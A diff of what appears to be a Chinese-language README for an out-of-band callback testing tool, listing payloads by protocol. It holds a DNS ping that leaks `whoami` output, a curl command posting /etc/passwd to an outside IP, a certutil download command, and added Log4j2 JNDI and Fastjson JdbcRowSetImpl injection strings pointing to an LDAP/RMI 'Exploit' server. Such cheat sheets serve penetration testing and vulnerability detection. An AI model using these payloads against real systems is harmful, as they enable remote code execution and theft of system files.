@@ -171,13 +171,29 @@ ping `whoami`.qrq.example.com
 
 #### HTTP
 
-```
+```sh
 curl 1.1.1.1/qrq/some/info
 curl -d @/etc/passwd 1.1.1.1/qrq/postdata
-
+certutil -urlcache -split -f http://1.1.1.1/x x
 ```
 
+#### LDAP
 
+log4j2 fastjson等可以使用此方法
+
+```
+${jndi:ldap://1.1.1.1:1389/Exploit}
+{"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;","dataSourceName":"ldap://1.1.1.1:1389/Exploit", "autoCommit":true}
+```
+
+#### RMI
+
+同上，log4j2 fastjson等
+
+```
+${jndi:rmi://1.1.1.1:1099/Exploit}
+{ "b":{ "@type":"com.sun.rowset.JdbcRowSetImpl", "dataSourceName":"rmi://1.1.1.1:1099/Exploit", "autoCommit":true } }
+```
 
 ## 👀 概览
 
